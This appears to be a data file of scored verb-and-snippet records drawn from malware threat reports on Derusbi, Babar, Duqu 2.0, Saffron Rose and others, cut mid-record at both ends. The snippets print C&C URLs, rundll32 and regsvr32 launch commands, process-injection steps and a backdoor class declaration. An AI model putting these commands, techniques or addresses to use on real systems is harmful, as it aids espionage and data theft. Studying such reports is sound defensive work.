software, plugins, and other related information, as well as\nload Java exploits designed to install malware on the target system')(0.21052631578947367, 'load', '\n<table>\nURL                    Meta Refresh Page\n\x0c\nhXXp://985.so/bUYj  N/A (HTTP 404)\nhXXp://985.so/bUYe  hXXp://58.64.178.77:80/SiteLoader\nhXXp://985.so/b6hW  hXXp://58.64.178.77/mPlayer\nhXXp://985.so/bUYf  hXXp://58.64.178.77:80/0wnersh1p\n</table>\nThese pages load scripts that conduct profiling of the system for various software, plugins, and other related information, as well as\nload Java exploits designed to install malware on the target system')(0.36363636363636365, 'upload', ' Attackers will often upload new webshells or add simple China Chopper style\nmodifications to legitimate existing files in an attempt to maintain persistence to these systems')(0.8333333333333334, 'install', ' If successful, the exploits will install either a 32-bit or 64-bit\nversion of the malware')(0.2222222222222222, 'install', ' This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install\nmalware on their systems')(1.0, 'added', ' These\ncompromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the\nimpacted websites')(0.8, 'placing', ' In the case of this post, it appears that at\nleast two different attackers were involved in compromising and placing malicious code on Pro-Democratic websites in Hong\nKong')(0.5555555555555556, 'placed', '\n</section>\n\n<section>\n<heading>Webshell Backdoor</heading>\n\nWhile examining the ATD website, Volexity also observed that the site had a password protected backdoor webshell placed on it')(0.9230769230769231, 'selects', '\n\x0c\n<figure>>\nclass BD_SOCK\n{\n  // members\n  ~BD_SOCK();           // destructor\n  BD_SOCK* Copy(bool fCopySocket); // duplicate object\n\n     // member variables\n     DWORD dwLastError;\n     char szHostName[256];\n     DWORD dwListeningPortNumber;\n     SOCKET sktRemoteEndpoint;\n     SOCKET hListeningSocket;\n     };\n\nclass PCC_SOCK: BD_SOCK\n{\n  ~PCC_SOCK(); // destructor\n\n  // virtual members\n  PCC_SOCK * Copy(bool fCopyListeningSocket);\n  SOCKET ConnectToRemoteEndpointByNameAndAttemptChannelByPOSTOrHandshake(int\na2, int a3, int a4, int a5, char *pszHostname, int wHostPort);\n  SOCKET ConnectToRemoteEndpointByNameAndHandshake(char *pszHostname, int\nwHostPort);\n  SOCKET ConnectToRemoteEndpointByNameAndPerformPOSTLogin(char *pszHostname,\nint wHostPort);\n  SOCKET WaitForClient();\n  int SendEncodedData(int dwPktType, void *payload, size_t dwPayloadSize);\n  int RecvEncodeData(DWORD *pdwPktType, char **pvPayload, DWORD\n*pdwPayloadSize);\n  void freeMemory(void *pMemory);\n\n     // member functions\n     int SendVictimInfo();\n     int WaitForReadEvent(int dwTimeout);\n     int SOCKSConnectWithRandomLocalPort(int dwEndPointIP, u_short hostshort);\n     int BindToRandomPort(SOCKET s);\n     int SendBuffer(SOCKET s, char *buf, int len);\n     SOCKET AcceptIncomingConnection();\n     SOCKET ConnectToRemoteEndpointByName(char *szHostName, int hostshort);\n     SOCKET ConnectToRemoteEndpoint(int dwIP, u_short wPort);\n     int ReadFromRemoteEndpoint(char *buf, int len);\n     SOCKET NewSocket();\n     int BindSocket(SOCKET s, int dwLowPort, int dwHighPort);\n     int SendAuthenicationResponse(void *pvResponse);\n     int SendHTTP200ResponseIfViaHeaderFound (char *Str);\n\n // member variables\n char compressionBuffer[65536];\n\n};\n</figure>\n<caption>Figure 1: PCC_SOCK Declaration in Pseudo-C++</caption>\n\nWith a new PCC_SOCK object allocates, DerusbiThread::DerusbiThread selects a port\nbetween 40,000 and 45,000 to use as a listening port')(0.45454545454545453, 'get', '\nThe mainLoop attempts to get the privileges for SeDebugPrivilege,\nSeLoadDriverPrivilege, SeShutdownPrivilege, and SeTcbPrivilege in order to\nperform the necessary operations to load the driver portion of the server variant')(0.75, 'opens', '\nDerusbiThread::DerusbiThread binds to the specified port and opens the port as a\nlistener')(0.23076923076923078, 'loaded', '\n\nWhen loaded into memory via a LoadLibrary or equivalent function call, the server variant will\ndetermine the name of the host binary (presumably svchost.exe) as well as its own DLL’s\nname')(0.625, 'hook', '\nThe server variant utilizes a device driver in order to hook into the Windows firewall by either\nusing largely undocumented Windows Firewall hooking techniques found in Windows XP and\nolder or by using the documented Windows Filtering Platform found in Windows Vista and later')(0.5882352941176471, 'determine', '\nThe server variant then attempts to determine if it has suitable access rights within the system in\norder to operation')(1.0, 'hooking', '\nThe driver, after hooking the firewall using either of the two mentioned interfaces, will inspect\nincoming network packets')(0.16666666666666666, 'hide', ' This allows an attacker to hide their\ncommunication within a cluster of network sessions originating from a single IP such as would\nbe the case for a client performing multiple HTTP requests against a web server')(0.2727272727272727, 'spawns', ' The binary then spawns a new thread that contains the main server variant code in order\nto allow the DllEntryPoint routine to return to the calling function')(0.7777777777777778, 'install', ' The\nDllRegisterServer function, among other tasks, will attempt to install the server variant as a\nserver on the victim’s machine')(1.0, 'sending', "\n\n\n<figure></figure>\n\n         <caption>Figure 4: Possible Presentations of the Payload Section of a Derusbi Server Variant's Datagram</caption>\n\nAfter sending the server information via the VictimInfoPacket, the server variant spins off a\nCommLoop thread for the connection and returns to waiting for new connections from clients to\nappear")(0.25, 'loading', ' The mainLoop function\nbegins by loading the unique infection ID for the victim’s machine from the registry (under the\nkey value located at HKLM\\SOFTWARE\\Microsoft\\Rpc\\Security)')(0.375, 'checks', ' The check for access rights effectively checks to see if the server variant\nprocess is running under the NT Authority')(0.2, 'executed', '\n</list>\n\n\n<heading> Commands </heading>\n\nSeveral\xa0commands\xa0can\xa0be\xa0executed\xa0in')(0.2222222222222222, 'reported', '\n\n\nAt\xa0startup\xa0Dino\xa0executes\xa0successively\xa0the\xa0commands\xa0stored\xa0in\xa0the\xa0“InitialCommands”\xa0field\xa0in\xa0its\xa0configuration;\nin\xa0the\xa0sample\xa0we\xa0analyzed\xa0they\xa0are:\n\n\n<list>\nsysinfo\ncominfos\n!ipconfig\xa0/all\n!ipconfig\xa0/displaydns\n!tracert\xa0www.google.com\n</list>\n\n\nThose\xa0commands\xa0serve\xa0as\xa0a\xa0reconnaissance\xa0step\xa0for\xa0the\xa0operators.\xa0Their\xa0execution\xa0is\xa0managed\xa0by\xa0the\nCMDEXEC\xa0module,\xa0the\xa0commands\xa0being\xa0stored\xa0in\xa0a\xa0queue\xa0inside\xa0the\xa0CMDEXECQ\xa0module.\xa0The\xa0result\xa0is\nreported\xa0to')(0.25, 'execute', '\n\n\nRoughly,\xa0Dino\xa0can\xa0be\xa0described\xa0as\xa0an\xa0elaborate\xa0backdoor\xa0built\xa0in\xa0a\xa0modular\xa0fashion.\xa0Among\xa0its\xa0technical\ninnovations,\xa0there\xa0is\xa0a\xa0custom\xa0file\xa0system\xa0to\xa0execute\xa0commands\xa0in')(0.0, 'add', '\n</section>\n\n<section>\n<heading> Tasks\xa0scheduling\xa0in\xa0a\xa0Unix\xa0fashion </heading>\n\nThe\xa0commands\xa0“cronadd”,\xa0“cronlist”\xa0and\xa0“crondel”\xa0serve\xa0respectively\xa0to\xa0add,\xa0list,\xa0and\xa0remove')(0.6666666666666666, 'copy', " If successful, OneDriveSolution will then proceed\nto copy data from the victim's computer to the OneDrive account")(0.5555555555555556, 'download', " The purpose of the downloader is to download and execute additional malware on the\nvictim's system")(0.5555555555555556, 'execute', " The purpose of the downloader is to download and execute additional malware on the\nvictim's system")(0.8, 'written', " In most cases,\nexecuting these executables will have resulted in two additional files being written to the victim's hard\ndisk")(0.16666666666666666, 'execute', ' </caption>\n\n\nAll of the CloudDuke "solutions" use the same loader, a piece of code whose primary purpose is to decrypt\nthe embedded, encrypted solution, load it in memory and execute it')(0.375, 'load', ' </caption>\n\n\nAll of the CloudDuke "solutions" use the same loader, a piece of code whose primary purpose is to decrypt\nthe embedded, encrypted solution, load it in memory and execute it')(0.5833333333333334, 'download', ' In most observed cases, the downloader will attempt to connect to a compromised\nwebsite to download an encrypted malicious payload which the downloader will decrypt and execute')(1.0, 'connect', ' In most observed cases, the downloader will attempt to connect to a compromised\nwebsite to download an encrypted malicious payload which the downloader will decrypt and execute')(0.8461538461538461, 'search', ' It will also search the OneDrive account\nfor files containing commands for the malware to execute')(0.36363636363636365, 'transmit', ' Detection based on communications </heading>\n\nThe malware can transmit information through HTTP traffic')(0.6666666666666666, 'reads', ' AES encryption of the configuration file </heading>\n\nThe analyzed main module of Duqu 2.0 and also the old Duqu sample reads configuration\ninformation from a special file')(0.6666666666666666, 'act', ' These proxies can act as HTTP or HTTPS servers')(1.0, 'be', ' It is most likely that one or more\ninfected computers can be proxy points towards the attacker, meaning that other infected\ncomputers communicate with these proxies')(0.8125, 'create', "\n\n \n<heading> 3.2 BABAR CAME TO STAY </heading>\n\nThe startup routine of the Babar implant will create a registry key under\n'[HKU]\\..\\CurrentVersion\\Run' to assure persistence")(0.875, 'applies', '\n\nApart from that, Babar comes with a userland rootkit component which applies global Windows\nhooks to invade all processes on its desktop')(0.25, 'invades', " MISCREANT'S IMPLANT </heading>\n\nBabar's implant is a 32-bit DLL written in C++, which upon start injects itself to running processes\nand invades desktop applications by applying a global Windows hooks")(0.3333333333333333, 'steal', " The predefined groups of\napplication names retrieved from the hardcoded configuration data set the scope of Babar's\nhooking advances:\n\n<list>\n   •   Internet communication\n       iexplore.exe,firefox.exe,opera.exe,chrome.exe,Safari.exe,msnmsgr.exe\n\n   •   File creation\n       excel.exe, winword.exe, powerpnt.exe, visio.exe, acrord32.exe, notepad.exe,\n       wordpad.exe.txt, rtf, xls, xlsx, ppt, pptx, doc, docx, pdf, vsd\n\n   •   Media\n       skype.exe, msnmsgr.exe, oovoo.exe, nimbuzz.exe, googletalk.exe, yahoomessenger.exe, x-\n       lite.exe\n</list>\n\nThe respective trampolines steal data going in or out of the hooked APIs on the fly")(0.3333333333333333, 'hides', " MISCREANT'S DROPPER </heading>\n\nThe dropper operates straight forward; it fetches the encrypted DLL from its own binary from\noutside its resource section, decrypts it and hides it in the file system")(1.0, 'fetches', " MISCREANT'S DROPPER </heading>\n\nThe dropper operates straight forward; it fetches the encrypted DLL from its own binary from\noutside its resource section, decrypts it and hides it in the file system")(0.8, 'installed', '\n\nA global Windows hook is installed into the Windows event chain')(0.3888888888888889, 'applies', '\n\n\n<heading> 3.5.2 INVADING DESKTOP PROCESSES </heading>\n\nThe Babar implant applies global Windows hooks to load its DLL into the process space of other\nprocesses')(0.5625, 'load', '\n\n\n<heading> 3.5.2 INVADING DESKTOP PROCESSES </heading>\n\nThe Babar implant applies global Windows hooks to load its DLL into the process space of other\nprocesses')(0.5333333333333333, 'steal', ' The analyzed malware consists of a dropper and an\nimplant, which invades Windows processes to steal data from instant messengers, softphones,\nbrowsers and office applications')(0.8571428571428571, 'includes', '\n\nFor grabbing audio streams Babar includes code\nfrom the OpenCORE AMR library [8]')(0.5555555555555556, 'steal', ' This way Babar can install API hooks for various APIs\nvia Windows Detours technique to actively steal data from arbitrary processes')(0.3076923076923077, 'install', ' This way Babar can install API hooks for various APIs\nvia Windows Detours technique to actively steal data from arbitrary processes')(0.2, 'performed', '\n\n\n\n\n                                                                                              <footer>  page | 9 </footer>\n\n<figure></figure> <caption> \x0c                         Illustration 3 | Named pipes opened by the main instance </caption>\n\n\n\n\n<heading> 3.5 FUNCTIONALITY </heading>\n\nThe spying activities are performed either through the Babar instance locally or via a global\nWindows hook invading all processes running in the same desktop')(0.375, 'logging', ' The implant is capable of\nlogging keystrokes, capture screen shots, spy on installed softphones and instant messengers next\nto a list of simpler espionage tricks')(0.6, 'push', '\n\nThe analyzed sample of Babar has two hard coded C&C server addresses which are included in its\nconfiguration data:\n\n<list>\n   •   http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php\n   •   http://www.gezelimmi.com/wp-includes/misc/bb/index.php\n</list>\n\nBoth servers were used to push spied information onto the remote site')(0.42105263157894735, 'has', '\n\nThe analyzed sample of Babar has two hard coded C&C server addresses which are included in its\nconfiguration data:\n\n<list>\n   •   http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php\n   •   http://www.gezelimmi.com/wp-includes/misc/bb/index.php\n</list>\n\nBoth servers were used to push spied information onto the remote site')(0.75, 'performs', '\n\n\n\n\n                                                                                          <footer>  page | 10 </footer>\n<figure></figure> <caption> \x0c               Illustration 4 | The keylogger module uses Windows RAWINPUT to achieve its goal </caption>\n\n\nThe snooped keystroke data is passed to a thread, which performs encryption and dumps the data\nto a log file')(0.8181818181818182, 'implements', '\n\n<list>\n4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f                      ThreatFire\n522e5549af01c747329d923110c058b7bb7e112816de64bd7919d7b9194fba5b                      Rising\n2fd5c42d49f9e0fe2daae5b0f78cf9cfde9bfc7b0ed59fc68e0a79a3b16fe05b\n06e387bb79584cdff3672feadea0bf6f783ce1ddc1fa91962d1b5bcd94e1a308\nf1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56                      Kaspersky\n588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c                      ZoneAlarm\nc8e8248940830e9f1dc600c189640e91c40f95caae4f3187fb04427980cdc479\nb3fe0e3a3e3befa152c4237b0f3a96ffaa44a2d7e1aa6d379d3a1ab4659e1676                      AntiVir\n</list>\n\nBabar also implements an obfuscation technique to hide certain API names')(0.5714285714285714, 'steal', ' The\nimplant is able to hook APIs of interest in dedicated remote processes, to steal data on the fly')(0.6363636363636364, 'creates', ' At the same time, the main instance\ncreates six named pipes using the very same GUID')(0.7, 'steal', ' Instance-local capabilities are\nbasic spying on window names or snooping on the clipboard data, while the global hooks manage\nto steal information directly from Windows API calls')(0.2, 'spying', ' Instance-local capabilities are\nbasic spying on window names or snooping on the clipboard data, while the global hooks manage\nto steal information directly from Windows API calls')(0.5714285714285714, 'load', ' Then it goes on to load the\nDLL using Windows regsvr32.exe')(1.0, 'reduces', ' This\nway the malware reduces forensic artefacts, staying behind after infection')(0.6, 'load', " At system boot time the regsvr32.exe process will start, load the\nBabar DLL and thus 'deploy' the malware to various legitimate processes")(0.7777777777777778, 'load', ' The steps being taken are:\n\n<list>\n   •   MapViewOfFile – mapped memory shared with the child instance\n   •   OpenProcess – obtaining a handle to the chosen victim process\n   •   VirtualAllocEx – allocate space in remote memory\n   •   WriteProcessMemory – write function stub to remote memory\n   •   CreateRemoteThread – execute function stub as remote process\n</list>\n\nThe function stub will then go on to load the Babar DLL through LoadLibraryA and execute one of\nits exports, as indicated in the shared memory')(1.0, 'execute', ' The steps being taken are:\n\n<list>\n   •   MapViewOfFile – mapped memory shared with the child instance\n   •   OpenProcess – obtaining a handle to the chosen victim process\n   •   VirtualAllocEx – allocate space in remote memory\n   •   WriteProcessMemory – write function stub to remote memory\n   •   CreateRemoteThread – execute function stub as remote process\n</list>\n\nThe function stub will then go on to load the Babar DLL through LoadLibraryA and execute one of\nits exports, as indicated in the shared memory')(0.3, 'spawning', '\n\nAfter infection the dropper executes a separate command line through spawning a cmd.exe\nprocess, which is instructed to wait for 1 second before deleting the dropper binary on disk')(0.3333333333333333, 'receive', ' The malware creates an invisible window, with no\nother purpose than to receive window messages')(0.7777777777777778, 'uses', '\n\nFor inter process communication Babar uses named pipes')(0.75, 'hook', ' Once in\nthe context of a desired target process, the malware goes on to hook specific APIs of interest')(0.8571428571428571, 'sniff', ' Babar is able to sniff all keystrokes\nhappening on the same desktop as its invisible window')(0.8666666666666667, 'spawns', ' To achieve this it spawns a dedicated process with the command\nline \'"regsvr32.exe" /s /n /i "%APPDATA%\\%DLLNAME%"\'')(0.6842105263157895, 'installing', '\n\nDuring this investigation, we also discovered many other the files installing this cyber-espionage tool in\nwhat appears to be a dedicated a spear phishing campaign')(1.0, 'is', '\n\nThe malware is capable of the following cyber-espionage operations:\n\n<list>\n      Logging keystrokes\n      Capturing audio from the computer\'s microphone\n      Capturing screenshots\n      Capturing geolocation data\n      Taking photos from the computer\'s web camera\n      Copying files to a remote server\n      Copying files to a special USB device if inserted\n      Hijjacking the clipboard and capturing information from the target machine\n</list>\n</section>\n\n<section>\n<heading>Targets of "Machete"</heading>\n\x0c\n\n<figure></figure>\n\nMost of the victims are located in, Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, among\nothers')(0.8, 'deliver', '\nThey deliver this malware as a malicious executable          \n(dropper)')(1.0, 'tailored', ' The\nattackers tailored these login pages for specific                           \ntargets in the DIB and spoofed a variety of services                        \nsuch as Outlook Web Access and VPN login pages')(0.46153846153846156, 'registered', ' The attackers\nregistered the domain “aeroconf2014[.]org” in\norder to impersonate the IEEE Aerospace\nconference—the conference’s actual domain is\naeroconf.org—and sent out an email with the\nfollowing information:\n<list>\nFrom: invite@aeroconf2014[.]org\nSubject: IEEE Aerospace Conference 2014\n</list>\nThe email encouraged users to visit a fake\nconference website owned by the attackers:\n\nUpon visiting the website, visitors were notified\nthat they must install “proxy” software in order to\naccess it, which is actually malware')(0.3, 'sent', ' The attackers\nregistered the domain “aeroconf2014[.]org” in\norder to impersonate the IEEE Aerospace\nconference—the conference’s actual domain is\naeroconf.org—and sent out an email with the\nfollowing information:\n<list>\nFrom: invite@aeroconf2014[.]org\nSubject: IEEE Aerospace Conference 2014\n</list>\nThe email encouraged users to visit a fake\nconference website owned by the attackers:\n\nUpon visiting the website, visitors were notified\nthat they must install “proxy” software in order to\naccess it, which is actually malware')(0.8461538461538461, 'drops', ' This implant, in turn,\ndrops various other components into C:\\                      \nDocuments and Settings\\{USER}\\Application\nData\\IntelRapidStart\\')(0.3, 'used', '                      \n                                                      \nThe first cluster contains the domain used in the     \nAerospace Conference attack as well as the            \ndomains used in phishing attacks designed to          \ncapture user credentials:                             \n                                                      \nThe website used in the Aerospace Conference\nattack was aeroconf2014[.]org, which is registered\nto info@usa.gov[.]us')(0.6, 'capture', '                      \n                                                      \nThe first cluster contains the domain used in the     \nAerospace Conference attack as well as the            \ndomains used in phishing attacks designed to          \ncapture user credentials:                             \n                                                      \nThe website used in the Aerospace Conference\nattack was aeroconf2014[.]org, which is registered\nto info@usa.gov[.]us')(0.5333333333333333, 'connected', ' We also observed crossover\nwith a sample that connected to both intel-\nupdate[.]com and ultrasms[.]ir, which was\nregistered by lvlr98@gmail[.]com')(0.5555555555555556, 'written', '                      \n                                                                  \nHarvested data is encrypted and written to disk on                \nthe local host')(0.5833333333333334, 'lure', ' We have seen this group                                     \nleverage varied social engineering tactics as a                                 \nmeans to lure their targets into infecting                                      \nthemselves with malware')(0.8181818181818182, 'uses', '\n  dll creates sqlite3.dll and\n  global atom\n</caption>\n\n<figure></figure>\n\n<caption>\n  Figure 5: IntelRS.exe sleeps\n  until global atom is set and\n  sqlite3.dll is present\n</caption>\n\n<figure></figure>\n\n\n<footer>7 www.fireeye.com</footer>\n\x0c\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n\nThe Stealer component uses common techniques                      \nto acquire credential data')(0.4444444444444444, 'committed', ' In\nyears past, Iranian actors primarily committed politically-motivated website defacement\nand DDoS attacks.<fn>1</fn> More recently, however, suspected Iranian actors have destroyed data\non thousands of computers with the Shamoon virus,<fn>2</fn> and they have penetrated the Navy\nMarine Corps Intranet (NMCI), which is used by the U.S')(0.23809523809523808, 'used', '\n</footnote>\n\n\n\n<footer>4 www.fireeye.com</footer>\n\x0c\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n<section>\n<heading>Credential Phishing</heading>                                                         \nThe attackers have also used phishing attacks, in                           \nwhich they set up Web pages to emulate various                              \nservices that require security credentials')(0.5882352941176471, 'connect', ' The user can\n configure the new backdoor to connect to a\n specific CnC server with a personalized username\n and password')(0.2727272727272727, 'drops', ' The executable is a CAB extractor that            \ndrops the implant IntelRS.exe')(0.8666666666666667, 'uses', ' For instance, it loads                \nvaultcli.DLL and uses various APIs shown below to                 \nacquire RDP accounts from the Windows vault')(1.0, 'loads', ' For instance, it loads                \nvaultcli.DLL and uses various APIs shown below to                 \nacquire RDP accounts from the Windows vault')(0.8666666666666667, 'bind', ' The attacker can bind the backdoor\n to a legitimate application of his or her choosing, or\n they can cloak it with an icon designed to make the\n backdoor appear as though it is a legitimate file')(0.8947368421052632, 'cloak', ' The attacker can bind the backdoor\n to a legitimate application of his or her choosing, or\n they can cloak it with an icon designed to make the\n backdoor appear as though it is a legitimate file')(0.2857142857142857, 'disguised', ' As such,\nwe believe that attackers disguised malware as\nanti-censorship tools in order to target the users of\nsuch tools inside Iran as well as Iranian dissidents\noutside the country')(0.4166666666666667, 'collect', '      \n\nOnce the state is set, IntelRS.exe proceeds to          \ncollect data from various areas in the system as        \ndescribed below:                                        \n<list>\n•\t    Collects system information: hostname,          \n      username, timezone, IP addresses, open ports,\n      installed applications, running processes, etc')(0.7142857142857143, 'collect', '                             \n                                                                            \nIf users attempt to login through these fake Web                            \npages, the attackers collect their login credentials')(0.8461538461538461, 'contained', '\nThese droppers contained icons used in the\nlegitimate installers for these programs')(0.7142857142857143, 'lure', '\n</footnote>\n\n<footer>3 www.fireeye.com</footer>\n\x0c\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n<section>\n<heading>Attack Vectors</heading>                                                                 \nWe have observed the Ajax Security Team use a                                  \nvariety of vectors to lure targets into installing                             \nmalicious software and/or revealing login                                      \ncredentials')(0.7096774193548387, 'include', ' These attack vectors include sending                              \nemail, private messages via social media, fake login\npages, and the propagation of anti-censorship                                  \nsoftware that has been infected with malware')(0.3, 'targeted', ' For example, the                                \nattackers targeted companies in the DIB using a                                \nfake conference page as a lure to trick targets into                           \ninstalling malicious software')(0.7142857142857143, 'has', ' The following files are               \nwritten to disk in this location:                            \n\n\n<table>\n                File                                               Functionality\n  IntelRS.exe             Various stealer components and encryption implementation\n  DelphiNative.dll        Browser URL extraction, IE Accounts, RDP accounts (Imported by IntelRS.exe)\n\n\n\n  IntelRS.exe.config      Config containing supported .NET versions for IntelRS.exe\n\n\n  AppTransferWiz.dll      FTP exfiltration (Launched by IntelRS.exe)\n\n\n\n  RapidStartTech.stl      Base64 encoded config block containing FTP credentials, implant name, decoy name, screenshot\n                          interval and booleans for startup, keylogger and screenshot\n</table>\n\nThe IntelRS.exe is written in .NET and is aptly\nnamed “Stealer”, as it has various data collection\nmodules')(0.5714285714285714, 'sent', '                                  \n</section>\n<section>\n<heading>Spear phishing</heading>                                                                 \nDuring our investigation, we discovered that these                             \nattackers sent targeted emails, as well as private\nmessages through social media')(0.375, 'perform', ' We also found incomplete code that would\nperform SFTP and SMTP exfiltration, which could         \nbe completed in a future version')(1.0, 'drops', ' It drops and launches AppTransferWiz.dll\nvia the following command:\n<list>\n“C:\\WINDOWS\\system32\\rundll32.exe” “C:\\\nDocuments and Settings\\{USER}\\Application\n\nData\\IntelRapidStart\\AppTransferWiz.dll”,#110\n</list>\n110 is an ordinal that corresponds to “StartBypass”\nexport in AppTransferWiz.dll')(0.6666666666666666, 'launches', ' It drops and launches AppTransferWiz.dll\nvia the following command:\n<list>\n“C:\\WINDOWS\\system32\\rundll32.exe” “C:\\\nDocuments and Settings\\{USER}\\Application\n\nData\\IntelRapidStart\\AppTransferWiz.dll”,#110\n</list>\n110 is an ordinal that corresponds to “StartBypass”\nexport in AppTransferWiz.dll')(0.7692307692307693, 'engaged', ' During that time period, the Chinese\nhacking community engaged in website\ndefacements and denial of service attacks in\nconjunction with incidents such as the accidental\nbombing of the Chinese embassy in Belgrade in\n1999, the collision of a U.S')(0.5, 'connects', ' This                  \nsample is a Stealer variant that connects to the\naforementioned intel-update[.]com as well as            \nplugin-adobe[.]com')(0.16666666666666666, 'connecting', ' Other domains\nseen resolving to IP address nearby include the         \nfollowing:                                              \n                                                        \nAside from the sample connecting to plugin-             \nadobe[.]com, we have not discovered any malware\nconnecting to these domains')(0.7777777777777778, 'spoof', '\n\nThese droppers were also designed to visually\nspoof the appearance of the above applications')(1.0, 'locate', ' However, with this information, an                               \nattacker can precisely locate the victim and                                 \nacquire the device’s specifications')(0.7142857142857143, 'acquire', ' However, with this information, an                               \nattacker can precisely locate the victim and                                 \nacquire the device’s specifications')(0.7777777777777778, 'attempt', '\n\nEven if the attackers can’t obtain root, they can\nattempt ptrace <fn>10</fn> to control the host app')(0.7777777777777778, 'leak', ' Aggressive ad                                    \nlibraries also leak the user’s private information')(0.7777777777777778, 'load', ' As\nshown in Listing 5, an attacker can load\nexecutables compiled from JNI code')(0.7727272727272727, 'target', ' root exploits)  16,579          11,706M         4,201         3,207M\n</table>\n</section>  \n\n<footer>14 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n<section>\n<heading>Conclusion</heading>\nIn the current golden age of Android ad              \nlibraries, Sidewinder Targeted Attacks can           \ntarget victims using info leakage and other          \nvulnerabilities of ad libraries to get valuable,     \nsensitive information')(0.23076923076923078, 'launch', '\n\nTable 1 proposes different attacks that an\nattacker can launch remotely on target devices\nthrough vulnerable ad libraries')(0.75, 'stolen', ' The right                      \npanel lists all information stolen from the                       \nvictim’s device')(0.16666666666666666, 'taking', ' If an app containing such                                \nvulnerability has sensitive Android permissions                                  \nsuch as access to the camera, a remote attacker                                  \ncould exploit it to perform sensitive tasks such as                              \ntaking photos or recording video, over the                                       \nInternet, without consent')(0.5, 'modify', '\n</section>\n\n<section>                                                                         \n<heading>Detonation without Android Context</heading>                                       \nAfter getting local access, the attacker can upload                      \nprivate and sensitive files from the victim’s device,                    \nor modify files that the host app can write to (e.g.,                    \nthe directory of the host app and SD Card with                           \nFAT file system)')(0.3333333333333333, 'getting', '\n</section>\n\n<section>                                                                         \n<heading>Detonation without Android Context</heading>                                       \nAfter getting local access, the attacker can upload                      \nprivate and sensitive files from the victim’s device,                    \nor modify files that the host app can write to (e.g.,                    \nthe directory of the host app and SD Card with                           \nFAT file system)')(1.0, 'upload', '\n</section>\n\n<section>                                                                         \n<heading>Detonation without Android Context</heading>                                       \nAfter getting local access, the attacker can upload                      \nprivate and sensitive files from the victim’s device,                    \nor modify files that the host app can write to (e.g.,                    \nthe directory of the host app and SD Card with                           \nFAT file system)')(1.0, 'make', '\n\n</footnote>\n\n\n<footer>7 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nTo make calls from the Javascript bridge                                       \nwithout user consent, we can invoke the                                        \ntelephony service to dial numbers directly via                                 \nbinder, as shown in Listing 3, where phone is\nthe remote Android telephony service and the                                   \nnumber 2 represents the second remote call')(0.7142857142857143, 'steal', ' Combined                                    \nwith the launcher modification attack introduced\nearlier, the attackers can redirect other app icons                          \n(e.g., bank or email app icons) to the phishing app                          \nand steal the user’s login credentials')(0.9473684210526315, 'use', '\nAttackers may rent servers close to the target\nservers, and use fake ARP packets to direct all the\ntraffic to go through the hijacking servers first for\nmonitoring and hijacking..ARP hijacking is a\nwell-known approach used in network attacks')(0.6666666666666666, 'is', '\nAttackers may rent servers close to the target\nservers, and use fake ARP packets to direct all the\ntraffic to go through the hijacking servers first for\nmonitoring and hijacking..ARP hijacking is a\nwell-known approach used in network attacks')(0.38095238095238093, 'executing', ' As noted by Google: “Use\nof this method in a WebView containing\nuntrusted content could allow an attacker to\nmanipulate the host application in unintended\nways, executing Java code with the permissions\nof the host application.”<fn>3</fn>\n\nIn particular, if an app running on Android API 16\nor below uses the JavaScript binding method\naddJavascriptInterface and loads the content\nin the WebView over HTTP, an attacker over the\nnetwork could hijack the HTTP traffic (e.g.,\nthrough WiFi or DNS hijacking) to inject\nmalicious content into the WebView and to\ncontrol the host application')(0.6666666666666666, 'manipulate', ' As noted by Google: “Use\nof this method in a WebView containing\nuntrusted content could allow an attacker to\nmanipulate the host application in unintended\nways, executing Java code with the permissions\nof the host application.”<fn>3</fn>\n\nIn particular, if an app running on Android API 16\nor below uses the JavaScript binding method\naddJavascriptInterface and loads the content\nin the WebView over HTTP, an attacker over the\nnetwork could hijack the HTTP traffic (e.g.,\nthrough WiFi or DNS hijacking) to inject\nmalicious content into the WebView and to\ncontrol the host application')(0.7692307692307693, 'hijack', ' As noted by Google: “Use\nof this method in a WebView containing\nuntrusted content could allow an attacker to\nmanipulate the host application in unintended\nways, executing Java code with the permissions\nof the host application.”<fn>3</fn>\n\nIn particular, if an app running on Android API 16\nor below uses the JavaScript binding method\naddJavascriptInterface and loads the content\nin the WebView over HTTP, an attacker over the\nnetwork could hijack the HTTP traffic (e.g.,\nthrough WiFi or DNS hijacking) to inject\nmalicious content into the WebView and to\ncontrol the host application')(0.5, 'sending', '\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker’s                  \napps uploaded to Google Play, etc')(0.2, 'implanting', '\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker’s                  \napps uploaded to Google Play, etc')(0.5, 'taking', '\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker’s                  \napps uploaded to Google Play, etc')(0.6, 'uploading', '\n</footnote>\n\n\n\n<footer>3 www.fireeye.com</footer>\n\x0c\n<header>FireEye: Sidewinder Targeted Attack against Android</header>\n\n\n\n\nincluding uploading local files, taking pictures,                 \nrecording audio/video, manipulating the                           \nclipboard, sending SMS, dialing numbers,                          \nimplanting bootkit, or installing the attacker’s                  \napps uploaded to Google Play, 